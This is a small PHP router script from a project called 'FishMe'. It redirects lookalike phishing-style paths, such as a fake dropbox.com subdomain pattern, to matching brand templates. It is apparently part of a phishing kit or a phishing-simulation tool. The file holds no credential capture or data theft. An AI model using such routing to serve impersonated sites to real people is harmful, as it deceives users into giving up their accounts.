<?php
/**
 * FishMe Router
 * Handles phishing-style URL paths and serves the real template transparently.
 * Example: /dropbox.com-random1.random2.page.dev/ → /templates/dropbox/
 */

$uri  = $_SERVER['REQUEST_URI'];
$path = parse_url($uri, PHP_URL_PATH);

// Match phishing-style path: /sitename.com-random1.random2.page.dev[/...]
if (preg_match('#^/([a-z0-9]+)\.com-[a-z0-9]+\.[a-z0-9]+\.page\.dev(/.*)?$#', $path, $m)) {
    $site = $m[1];
    $rest = rtrim($m[2] ?? '', '/');
    $target = '/templates/' . preg_replace('/[^a-z0-9_-]/', '', $site) . '/' . ltrim($rest, '/');
    header('Location: ' . $target);
    exit;
}

// Everything else: serve normally from filesystem
return false;
